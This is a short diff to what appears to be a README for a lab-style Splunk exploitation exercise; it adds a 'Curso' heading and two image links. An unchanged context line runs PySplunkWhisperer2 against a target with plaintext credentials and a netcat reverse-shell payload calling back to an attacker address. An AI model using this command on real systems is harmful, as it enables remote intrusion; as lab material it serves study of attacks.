@@ -26,3 +26,7 @@ Kali Linux, Parrot.
 
 python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.16.110  --username shaun --password Guitar123 --payload 'nc.traditional -e/bin/sh '10.10.16.110' '4444''
 ~~~
+
+## Curso
+![images](Remote.jpg)
+![images](Main.jpg)
